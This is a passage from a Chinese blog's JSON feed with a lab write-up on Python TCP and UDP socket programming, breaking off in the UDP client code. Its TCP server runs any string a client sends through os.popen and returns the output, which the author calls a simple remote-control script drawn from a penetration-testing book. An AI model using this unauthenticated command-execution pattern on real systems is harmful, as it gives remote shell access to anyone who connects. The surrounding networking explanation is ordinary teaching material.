风格这种的后面接选项的工具。通过设置全局变量来达到不同的功能，这种编程思想开拓了我的眼界。</p>\n</blockquote>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/py-socket-experiment/",
            "url": "https://or0kit.github.io/Programming/Python/py-socket-experiment/",
            "title": "Python-socket编程",
            "date_published": "2020-11-26T13:18:04.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>计算机双语实验写 |ू･ω･` ) 的。</p>\n<h2 id=\"tcp\"><a class=\"anchor\" href=\"#tcp\">#</a> TCP</h2>\n<blockquote>\n<p>当初看了李华峰的《Python 渗透测试编程技术 方法与实践》里面就介绍了 socket 编程用客户端去控制服务端的的简单远程操控脚本。于是就准备自己写一个，可是写了之后发现自己写的很 Low，于是就想到前辈们常说的 “不要重复造轮子” ，就去网上找了一个，这个还不错。忘记原作者的地址，转载自 CSDN。</p>\n</blockquote>\n<h3 id=\"tcp-服务端server\"><a class=\"anchor\" href=\"#tcp-服务端server\">#</a> TCP 服务端（server）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket<span class=\"token punctuation\">,</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>server <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 指的是 tcp 协议</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>server<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>server<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"开始等待连接!!!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    conn<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">=</span> server<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"客户端地址：\"</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"端口：\"</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"客户端连接成功\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"开始工作\"</span><span class=\"token punctuation\">.</span>center<span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"等待新指令：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            msg <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收客户端信息并解码，默认为 UTF-8 编码</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> msg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">elif</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"bye\"</span> <span class=\"token keyword\">or</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"客户端[%s:%s]已断开连接！！！\\n\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"执行新指令：%s\"</span> <span class=\"token operator\">%</span> msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token comment\"># 接受字符串，相当于在 dos 命令界面，执行命令</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                cmd_res <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token comment\"># 将命令的结果编译成 \\xx\\xx\\xx, 再进行统计字符数，因为结果中有汉字，编码后的一个汉字</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token comment\">#为三个字符，所以客户端接收的时候也要统计 bytes 类型的字符数</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                cmd_size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cmd_res<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">if</span> cmd_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果执行的是错误的命令，数据大小就为 0，就执行下面的语句</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    <span class=\"token comment\"># 发送一个 0 给客户端，客户端接收的是个字符串 0 就表示命令有误，可以重新输入</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                    conn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                    <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                <span class=\"token comment\"># 发送响应数据的大小（全部是变为 bytes 类型后统计的字符数）    </span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                conn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>cmd_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                cli_res <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cli_res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                conn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>cmd_res<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 发送真实的数据</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"all send done。。。。。。\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\"># 客户端轻强制断开时，服务端会报这个错误，利用断言来捕获异常        </span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">except</span> ConnectionResetError <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>  </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>TCP黏包问题：</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>面向流的通信特点和Nagle算法：</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>TCP（transport control protocol，传输控制协议）是面向连接的，面向流的，提供高可靠性服务。</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>收发两端（客户端和服务器端）都要有一一成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>到对方，使用了优化方法（Nagle算法），</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>将多次间隔较小且数据量小的数据，合并成一个大的数据块，然后进行封包。</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。 即面向流的通信是无消息保护边界的。</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>对于空消息：tcp是基于数据流的，于是收发的消息不能为空，这就需要在客户端和服务端都添加空消息的处理机</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>制，防止程序卡住，而udp是基于数据报的，</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>即便是你输入的是空内容（直接回车），也可以被发送，udp协议会帮你封装上消息头发送过去。</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>可靠黏包的tcp协议：tcp的协议数据不会丢，没有收完包，下次接收，会继续上次继续接收，己端总是在收到ack</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>时才会清除缓冲区内容。数据是可靠的，</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>但是会粘包。</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>黏包有两种：</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>一种是因为发送数据包时，每次发送的包小，因为系统进行优化算法，就将两次的包放在一起发送，减少了资源的</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>重复占用。多次发送会经历多次网络延迟，</pre></td></tr><tr><td data-num=\"62\"></td><td><pre>一起发送会减少网络延迟的次数。因此在发送小数据时会将两次数据一起发送，而客户端接收时，则会一并接收。</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>#即出现多次send会出现黏包</pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>第二种是因为接收数据时，又多次接收，第一次接收的数据量小，导致数据还没接收完，就停下了，剩余的数据会</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>缓存在内存中，然后等到下次接收时和下</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>一波数据一起接收。</pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>发送方问题：</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>发送端需要等缓冲区满才发送出去，造成粘包（发送数据时间间隔很短，数据了很小，会合到一起，产生粘包）</pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>接收方问题：</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>接收方不及时接收缓冲区的包，造成多个包接收（客户端发送了一段数据，服务端只收了一小部分，服务端下次再</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>收的时候还是从缓冲区拿上次遗留的数据，</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>产生粘包）</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>'''</span></pre></td></tr></table></figure><h3 id=\"tcp-客户端client\"><a class=\"anchor\" href=\"#tcp-客户端client\">#</a> TCP 客户端（client）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>client <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>client<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    msg <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\">>>:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> msg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    client<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 发送命令</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"bye\"</span> <span class=\"token keyword\">or</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    cmd_size <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收响应数据的大小，此时接收的数据为 bytes 类型</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> cmd_size<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果等于字符串 0 就表示命令有误</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"执行无结果，可能命令错误，请重新输入\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"数据总大小为：\"</span><span class=\"token punctuation\">,</span> cmd_size<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\"># 将结果解码，如果不解码，打印的结果中前面会多一个 “b” 例如：b\"593\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    client<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"已收到发的数据。\"</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>     <span class=\"token comment\"># 防止黏包，只有 TCP 有粘包现象，UDP 永远不会粘包</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    data_size <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 数据的起始值</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    data_total <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span>  <span class=\"token comment\"># 空值，用于和后面接收的数据拼接起来，形成完整的响应数据</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">while</span> data_size <span class=\"token operator\">!=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cmd_size<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># 判断服务端发送的大小和客户端接收的大小是否一致，一致表示全部接收，不一致时一直循环接收数据</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        data <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收的是 bytes 类型</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        data_size <span class=\"token operator\">+=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\"># 接收的数据大小，这里的汉字也变成了 bytes 类型，一个汉字为 3 个字符，和服务端一致</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data_total <span class=\"token operator\">+=</span> data  <span class=\"token comment\"># 这里不能解码，因为拼接的类型就是 bytes 类型</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"实际接收的大小：\"</span><span class=\"token punctuation\">,</span> data_size<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 实际接收的总数据大小</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data_total<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将所有接收到的结果进行解码，得到可见的结果</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv done ......\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>client<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"udp\"><a class=\"anchor\" href=\"#udp\">#</a> UDP</h2>\n<p>这仅仅是一个简单的 socket 通信脚本</p>\n<h3 id=\"udp服务端server\"><a class=\"anchor\" href=\"#udp服务端server\">#</a> UDP 服务端（server）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>UDP 服务端</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>accept()和connect()方法都不需要</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre># 接收客户端传来的数据 recvfrom接收客户端的数据，默认是阻塞的，直到有客户端传来数据</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        # recvfrom 参数的意义，表示最大能接收多少数据，单位是字节</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        # recvfrom返回值说明</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        # receive_data表示接受到的传来的数据,是bytes类型</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        # client  表示传来数据的客户端的身份信息，客户端的ip和端口，元组</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre># 创建一个套接字socket对象，用于进行通讯</pre></td></tr><tr><td data-num=\"13\"></td><td><pre># # socket.AF_INET 指明使用INET地址集，进行网间通讯</pre></td></tr><tr><td data-num=\"14\"></td><td><pre># # socket.SOCK_DGRAM 指明使用数据协议，即使用传输层的udp协议</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">import</span> socket  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">import</span> time  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># server 接收端</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>server_socket <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_DGRAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>address <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9977</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>server_socket<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>server_socket<span class=\"token punctuation\">.</span>settimeout<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 设置一个时间提示，如果 10 秒钟没接到数据进行提示</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ヽ(ー_ー)ノ启动socket服务，等待客户端连接...'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        now <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 获取当前时间</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        receive_data<span class=\"token punctuation\">,</span> client <span class=\"token operator\">=</span> server_socket<span class=\"token punctuation\">.</span>recvfrom<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        server_socket<span class=\"token punctuation\">.</span>sendto<span class=\"token punctuation\">(</span><span class=\"token string\">\"服务器已收到你的信息la(๑╹ヮ╹๑)ﾉ \"</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> client<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> receive_data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token string\">\"结束通讯 (￢_￢)瞄\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>strftime<span class=\"token punctuation\">(</span><span class=\"token string\">'%Y-%m-%d %H:%M:%S'</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>now<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 以指定格式显示时间</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"收到(*￣︶￣)来自客户端&#123;&#125;端口为&#123;&#125;,发送的\\n*********\\n&#123;&#125;\\n*********\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>client<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> client<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> receive_data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">except</span> socket<span class=\"token punctuation\">.</span>timeout<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果 10 秒钟没有接收数据进行提示</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"10秒没理我la(^_−)☆\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"udp客户端client\"><a class=\"anchor\" href=\"#udp客户端client\">#</a> UDP 客户端（client）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>UDP</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>客户端</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>创建套接字，连接远端地址</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>连接后发送数据和接受数据</pre></td></tr><tr><td 